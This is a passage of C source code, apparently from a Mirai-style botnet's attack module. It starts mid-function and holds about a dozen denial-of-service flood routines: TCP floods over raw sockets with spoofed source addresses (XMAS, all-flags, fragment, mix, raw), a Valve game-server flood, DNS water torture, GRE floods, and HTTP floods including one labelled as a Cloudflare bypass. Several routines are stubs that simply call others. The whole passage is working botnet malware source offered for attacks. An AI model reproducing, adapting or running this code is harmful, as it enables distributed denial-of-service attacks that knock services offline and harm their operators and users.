    tcph->syn = 1;
    tcph->ack = 1;
    tcph->window = htons(65535);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) { free(pktbuf); return; }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    struct sockaddr_in addr_sin;
    addr_sin.sin_family = AF_INET;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            iph->daddr = targs[i].addr.s_addr;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(pktbuf);
    close(fd);
}

/* TCP STDHEX flood */
static void attack_tcp_stdhex(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    attack_tcp_hex(addr, targs_netmask, targs, targs_len, opts, opts_len);
}

/* TCP XMAS flood */
static void attack_tcp_xmas(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    char *pktbuf;
    int pktsize;
    uint16_t dport, sport;
    uint8_t ttl;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    ttl = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_IP_TTL);
    if (ttl == 0) ttl = 64;

    pktsize = sizeof(struct iphdr) + sizeof(struct tcphdr);
    pktbuf = malloc(pktsize);
    memset(pktbuf, 0, pktsize);

    struct iphdr *iph = (struct iphdr *)pktbuf;
    struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(pktsize);
    iph->id = htons(rand_next() % 0xFFFF);
    iph->ttl = ttl;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = rand_next() % 0xFFFFFFFF;

    tcph->source = htons(sport);
    tcph->dest = htons(dport);
    tcph->seq = rand_next() % 0xFFFFFFFF;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->fin = 1;
    tcph->psh = 1;
    tcph->urg = 1;
    tcph->window = htons(65535);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) { free(pktbuf); return; }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    struct sockaddr_in addr_sin;
    addr_sin.sin_family = AF_INET;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            iph->daddr = targs[i].addr.s_addr;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(pktbuf);
    close(fd);
}

/* TCP ALL flags flood */
static void attack_tcp_all(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    char *pktbuf;
    int pktsize;
    uint16_t dport, sport;
    uint8_t ttl;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    ttl = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_IP_TTL);
    if (ttl == 0) ttl = 64;

    pktsize = sizeof(struct iphdr) + sizeof(struct tcphdr);
    pktbuf = malloc(pktsize);
    memset(pktbuf, 0, pktsize);

    struct iphdr *iph = (struct iphdr *)pktbuf;
    struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(pktsize);
    iph->id = htons(rand_next() % 0xFFFF);
    iph->ttl = ttl;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = rand_next() % 0xFFFFFFFF;

    tcph->source = htons(sport);
    tcph->dest = htons(dport);
    tcph->seq = rand_next() % 0xFFFFFFFF;
    tcph->ack_seq = rand_next() % 0xFFFFFFFF;
    tcph->doff = 5;
    tcph->fin = 1;
    tcph->syn = 1;
    tcph->rst = 1;
    tcph->psh = 1;
    tcph->ack = 1;
    tcph->urg = 1;
    tcph->window = htons(65535);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) { free(pktbuf); return; }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    struct sockaddr_in addr_sin;
    addr_sin.sin_family = AF_INET;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            iph->daddr = targs[i].addr.s_addr;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(pktbuf);
    close(fd);
}

/* TCP fragment flood */
static void attack_tcp_frag(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    char *pktbuf;
    int pktsize;
    uint16_t dport, sport;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    pktsize = sizeof(struct iphdr) + 8;
    pktbuf = malloc(pktsize);
    memset(pktbuf, 0, pktsize);

    struct iphdr *iph = (struct iphdr *)pktbuf;

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(8);
    iph->id = htons(rand_next() % 0xFFFF);
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->frag_off = htons(0x2000); /* More fragments */
    iph->saddr = rand_next() % 0xFFFFFFFF;

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) { free(pktbuf); return; }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    struct sockaddr_in addr_sin;
    addr_sin.sin_family = AF_INET;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            iph->daddr = targs[i].addr.s_addr;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
            sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(pktbuf);
    close(fd);
}

/* Async SYN flood */
static void attack_tcp_asyn(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    attack_tcp_syn(addr, targs_netmask, targs, targs_len, opts, opts_len);
}

/* USYN flood */
static void attack_tcp_usyn(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    attack_tcp_syn(addr, targs_netmask, targs, targs_len, opts, opts_len);
}

/* ACKER PPS flood */
static void attack_tcp_ackerpps(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    attack_tcp_ack(addr, targs_netmask, targs, targs_len, opts, opts_len);
}

/* TCP MIX flood */
static void attack_tcp_mix(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    char *pktbuf;
    int pktsize;
    uint16_t dport, sport;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    pktsize = sizeof(struct iphdr) + sizeof(struct tcphdr);
    pktbuf = malloc(pktsize);
    memset(pktbuf, 0, pktsize);

    struct iphdr *iph = (struct iphdr *)pktbuf;
    struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(pktsize);
    iph->id = htons(rand_next() % 0xFFFF);
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = rand_next() % 0xFFFFFFFF;

    tcph->source = htons(sport);
    tcph->dest = htons(dport);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) { free(pktbuf); return; }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    struct sockaddr_in addr_sin;
    addr_sin.sin_family = AF_INET;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            tcph->seq = rand_next() % 0xFFFFFFFF;
            tcph->ack_seq = rand_next() % 0xFFFFFFFF;
            tcph->doff = 5;
            tcph->fin = rand_next() % 2;
            tcph->syn = rand_next() % 2;
            tcph->rst = rand_next() % 2;
            tcph->psh = rand_next() % 2;
            tcph->ack = rand_next() % 2;
            tcph->urg = rand_next() % 2;
            tcph->window = htons(65535);

            iph->daddr = targs[i].addr.s_addr;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(pktbuf);
    close(fd);
}

/* TCP bypass flood */
static void attack_tcp_bypass(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    attack_tcp_syn(addr, targs_netmask, targs, targs_len, opts, opts_len);
}

/* TCP nflag flood */
static void attack_tcp_nflag(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    char *pktbuf;
    int pktsize;
    uint16_t dport, sport;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    pktsize = sizeof(struct iphdr) + sizeof(struct tcphdr);
    pktbuf = malloc(pktsize);
    memset(pktbuf, 0, pktsize);

    struct iphdr *iph = (struct iphdr *)pktbuf;
    struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(pktsize);
    iph->id = htons(rand_next() % 0xFFFF);
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = rand_next() % 0xFFFFFFFF;

    tcph->source = htons(sport);
    tcph->dest = htons(dport);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->fin = 0;
    tcph->syn = 0;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(65535);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) { free(pktbuf); return; }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    struct sockaddr_in addr_sin;
    addr_sin.sin_family = AF_INET;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            iph->daddr = targs[i].addr.s_addr;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(pktbuf);
    close(fd);
}

/* TCP OVH nuke flood */
static void attack_tcp_ovhnuke(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    attack_tcp_syn(addr, targs_netmask, targs, targs_len, opts, opts_len);
}

/* TCP raw flood */
static void attack_tcp_raw(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    char *pktbuf;
    int pktsize;
    uint16_t dport, sport;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    pktsize = sizeof(struct iphdr) + sizeof(struct tcphdr);
    pktbuf = malloc(pktsize);
    memset(pktbuf, 0, pktsize);

    struct iphdr *iph = (struct iphdr *)pktbuf;
    struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(pktsize);
    iph->id = htons(rand_next() % 0xFFFF);
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = rand_next() % 0xFFFFFFFF;

    tcph->source = htons(sport);
    tcph->dest = htons(dport);
    tcph->seq = rand_next() % 0xFFFFFFFF;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(65535);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) { free(pktbuf); return; }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    struct sockaddr_in addr_sin;
    addr_sin.sin_family = AF_INET;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            iph->daddr = targs[i].addr.s_addr;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(pktbuf);
    close(fd);
}

/* ============================================================================
 * SPECIAL ATTACK METHODS
 * ============================================================================ */

/* VSE (Valve Source Engine) flood */
static void attack_udp_vse(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i, payload_len;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport;

    table_unlock_val(TABLE_ATK_VSE);
    payload = table_retrieve_val(TABLE_ATK_VSE, &payload_len);
    table_lock_val(TABLE_ATK_VSE);

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 27015;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_len, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    close(fd);
}

/* DNS water torture */
static void attack_udp_dns(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char query[512];
    uint16_t dport;
    char *domain;

    domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    if (domain == NULL) return;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 53;

    struct dnshdr *dns = (struct dnshdr *)query;
    dns->id = htons(rand_next() % 0xFFFF);
    dns->opts = htons(0x0100);
    dns->qdcount = htons(1);
    dns->ancount = 0;
    dns->nscount = 0;
    dns->arcount = 0;

    char *qname = (char *)(dns + 1);
    resolv_domain_to_hostname(qname, domain);

    struct dns_question *question = (struct dns_question *)(qname + util_strlen(domain) + 2);
    question->qtype = htons(1);
    question->qclass = htons(1);

    int query_len = sizeof(struct dnshdr) + util_strlen(domain) + 2 + sizeof(struct dns_question);

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, query, query_len, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    close(fd);
}

/* GRE IP flood */
static void attack_gre_ip(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    char *pktbuf;
    int pktsize;
    uint16_t dport;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);

    pktsize = sizeof(struct iphdr) + 4 + sizeof(struct iphdr) + sizeof(struct udphdr) + 512;
    pktbuf = malloc(pktsize);
    util_zero(pktbuf, pktsize);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) { free(pktbuf); return; }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    for (i = 0; i < targs_len; i++) {
        while (attack_ongoing[0]) {
            struct iphdr *outer_ip = (struct iphdr *)pktbuf;
            uint16_t *gre = (uint16_t *)(pktbuf + sizeof(struct iphdr));
            struct iphdr *inner_ip = (struct iphdr *)(pktbuf + sizeof(struct iphdr) + 4);

            outer_ip->ihl = 5;
            outer_ip->version = 4;
            outer_ip->tot_len = htons(pktsize);
            outer_ip->protocol = IPPROTO_GRE;
            outer_ip->daddr = targs[i].addr.s_addr;
            outer_ip->saddr = rand_next() % 0xFFFFFFFF;

            gre[0] = 0;
            gre[1] = htons(0x0800);

            inner_ip->ihl = 5;
            inner_ip->version = 4;
            inner_ip->tot_len = htons(pktsize - sizeof(struct iphdr) - 4);
            inner_ip->protocol = IPPROTO_UDP;
            inner_ip->daddr = rand_next() % 0xFFFFFFFF;
            inner_ip->saddr = rand_next() % 0xFFFFFFFF;

            sendto(fd, pktbuf, pktsize, 0, NULL, 0);
        }
    }

    free(pktbuf);
    close(fd);
}

/* GRE Ethernet flood */
static void attack_gre_eth(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    attack_gre_ip(addr, targs_netmask, targs, targs_len, opts, opts_len);
}

/* ============================================================================
 * HTTP/HTTPS ATTACK METHODS
 * ============================================================================ */

/* HTTP flood */
static void attack_http(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    char *domain, *path, *method, *post_data;
    char request[2048];
    uint16_t dport;
    int conns;

    domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    if (domain == NULL) return;

    path = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_HTTP_PATH);
    if (path == NULL) path = "/";

    method = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_HTTP_METHOD);
    if (method == NULL) method = "GET";

    post_data = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_HTTP_POST_DATA);

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    conns = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_CONNS);
    if (conns == 0) conns = 1;

    for (i = 0; i < targs_len; i++) {
        int j;
        for (j = 0; j < conns; j++) {
            fd = socket(AF_INET, SOCK_STREAM, 0);
            if (fd == -1) continue;

            struct sockaddr_in addr_sin;
            addr_sin.sin_family = AF_INET;
            addr_sin.sin_port = htons(dport);
            addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

            fcntl(fd, F_SETFL, O_NONBLOCK);

            if (connect(fd, (struct sockaddr *)&addr_sin, sizeof(addr_sin)) == 0 || errno == EINPROGRESS) {
                int req_len = snprintf(request, sizeof(request),
                    "%s %s HTTP/1.1\r\n"
                    "Host: %s\r\n"
                    "Connection: Keep-Alive\r\n"
                    "User-Agent: Mozilla/5.0\r\n"
                    "Accept: */*\r\n\r\n",
                    method, path, domain);

                if (post_data != NULL) {
                    req_len = snprintf(request, sizeof(request),
                        "%s %s HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "Connection: Keep-Alive\r\n"
                        "User-Agent: Mozilla/5.0\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n"
                        "Content-Length: %d\r\n\r\n%s",
                        method, path, domain, util_strlen(post_data), post_data);
                }

                send(fd, request, req_len, 0);
            }

            close(fd);
        }
    }

    while (attack_ongoing[0]) {
        usleep(10000);
    }
}

/* HTTPS flood */
static void attack_https(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    attack_http(addr, targs_netmask, targs, targs_len, opts, opts_len);
}

/* Cloudflare bypass */
static void attack_cf(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    attack_http(addr, targs_netmask, targs, targs_len, opts, opts_len);
}
